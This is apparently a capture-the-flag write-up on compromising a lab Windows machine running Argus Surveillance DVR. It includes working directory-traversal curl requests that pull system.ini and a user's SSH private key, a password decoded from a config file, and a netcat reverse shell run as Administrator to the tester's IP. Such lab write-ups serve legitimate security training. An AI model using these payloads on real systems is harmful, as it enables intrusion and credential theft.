target 192.168.57.179

<img width="793" height="264" alt="image" src="https://github.com/user-attachments/assets/7e944dc0-ed33-4e2f-b0b2-1bb66752b1f2" />

recon 

nmap

```bash
sudo nmap -sC -sV -vvvv -p- dvr4 -sT -T5 --min-rate=5000
```
```bash
sudo nmap -sC -sV -vvvv -p- dvr4 -sT -T5 --min-rate=5000

PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5040/tcp  open  unknown       syn-ack
7680/tcp  open  pando-pub?    syn-ack
8080/tcp  open  http-proxy    syn-ack
|_http-title: Argus Surveillance DVR
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
|_http-favicon: Unknown favicon MD5: 283B772C1C2427B56FC3296B0AF42F7C
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0">
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0">
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
```
445/TCP - SMB

<img width="500" height="27" alt="image" src="https://github.com/user-attachments/assets/eb4a71f1-ab11-47b2-96b2-e34fe251f4dd" />

```bash
 smbclient -L //dvr4/ -N
```
<img width="607" height="77" alt="image" src="https://github.com/user-attachments/assets/4c39b6a6-948d-49ad-b0e1-d8c341bf1971" />

8080/TCP - HTTP

<img width="455" height="26" alt="image" src="https://github.com/user-attachments/assets/2b74caaa-f460-47b4-aaee-4353eed69427" />

<img width="1263" height="261" alt="image" src="https://github.com/user-attachments/assets/0cfeeb5d-b820-4088-800d-bfad3d0e74d0" />

I look up exploits matching the service:

<img width="1427" height="919" alt="image" src="https://github.com/user-attachments/assets/4ecc651e-25b6-4533-9d5d-884c605f91d6" />

I actually get quite a lot of them, let’s try out the Directory Traversal one and then Weak Password Encryption later.

<img width="1540" height="885" alt="image" src="https://github.com/user-attachments/assets/4b8458a2-589b-449c-b7b0-2ce8ccc89c1d" />

```bash
# poc
curl "http://dvr4:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```
<img width="1230" height="385" alt="image" src="https://github.com/user-attachments/assets/fa2a6ade-9aea-4ab8-b8b5-2dbeeb34aa78" />

We indeed get the intended result.

Back on the website we find the user we’re looking for:

<img width="1257" height="616" alt="image" src="https://github.com/user-attachments/assets/7b3a9bd5-faec-4075-8b82-4ca806976f6e" />

We want to get the ssh key of viewer so we can then log in.

```bash
curl "http://dvr4:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa
```
<img width="1028" height="793" alt="image" src="https://github.com/user-attachments/assets/5d5f58b2-b4e3-45bd-b136-40bf2a201036" />

Now that we have the id_rsa key, we can use it to log into SSH.

foothold

```bash
chmod 600 id_rsa
```
```bash                                                                                                            
ssh -i id_rsa viewer@dvr4
```
<img width="668" height="149" alt="image" src="https://github.com/user-attachments/assets/b54c619f-1766-4c80-9d85-6ed43e015462" />
<img width="823" height="119" alt="image" src="https://github.com/user-attachments/assets/ea853f59-9d05-48bb-9330-412fe740e400" />

Let’s check out the home directory:

<img width="994" height="534" alt="image" src="https://github.com/user-attachments/assets/91c9ee4e-38ee-44fa-b8d3-61bd39ad60a3" />

We notice the user already has nc.exe as well as psexec.exe in here… Might be a clue.

Let’s snatch the local.txt first.

<img width="558" height="51" alt="image" src="https://github.com/user-attachments/assets/b96c0167-7f34-4623-b35f-5323e5f32555" />

Privilege Escalation
PoC

We also have another PoC:
<img width="1495" height="964" alt="image" src="https://github.com/user-attachments/assets/80d4733e-bfc9-49ac-ad00-0a25f47b9625" />

In here we see a mention of the .ini file, let’s check it out.

```bash
type "C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini"
```
<img width="1020" height="144" alt="image" src="https://github.com/user-attachments/assets/f807d454-2df8-42f6-97d4-4379812c744c" />

<img width="639" height="26" alt="image" src="https://github.com/user-attachments/assets/37d50817-b388-443f-8861-ff3f740d3ce6" />

<img width="736" height="22" alt="image" src="https://github.com/user-attachments/assets/479c8214-2ab0-4636-bf4c-e7207dfc59eb" />

```bash
ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
```

<img width="745" height="148" alt="image" src="https://github.com/user-attachments/assets/623d51a1-dc53-426c-9015-979be90e5f34" />

<img width="913" height="629" alt="image" src="https://github.com/user-attachments/assets/4e81ef08-10e3-429f-a0c6-3635d403561b" />

We found the pasword 14WatchD0g, but the last character is unknown. So we check the script again. The programmer was "too lazy to add special characters". So we may need to try each special characters.

<img width="674" height="715" alt="image" src="https://github.com/user-attachments/assets/837a2aae-2857-448c-b16e-933b09f098d2" />

We can try to run an SSH password spraying attack using Hydra, but it seems like we are unable to find any valid passwords. This could be because Administrator doesn’t allow for SSH logins.

We keep trying passwords from our list until eventually, we get an output that is slightly different (using the password 14WatchD0g$). We can try using a reverse shell command to get a shell session back as Administrator.

Firstly, we start a netcat listener on Kali:

<img width="513" height="104" alt="image" src="https://github.com/user-attachments/assets/61df1f27-4e1b-4252-bd14-0ac488ae4342" />

```bash
runas /user:Administrator "nc.exe -e powershell.exe 192.168.49.57 443"
```
<img width="1071" height="333" alt="image" src="https://github.com/user-attachments/assets/8abd74ee-31ed-46bc-9cd2-2c12ded7b13c" />

<img width="1012" height="60" alt="image" src="https://github.com/user-attachments/assets/18c1d512-4ea0-42df-9dad-4d24168a894c" />

<img width="839" height="252" alt="image" src="https://github.com/user-attachments/assets/65ce81a2-bf3e-4c85-8953-9a16bd95eb42" />

<img width="577" height="106" alt="image" src="https://github.com/user-attachments/assets/1490088d-229a-4c73-aa97-97688db050fd" />

BOOM!!

<img width="846" height="95" alt="image" src="https://github.com/user-attachments/assets/61f4e122-934f-4d57-9116-a85788d12892" />

Got the flag
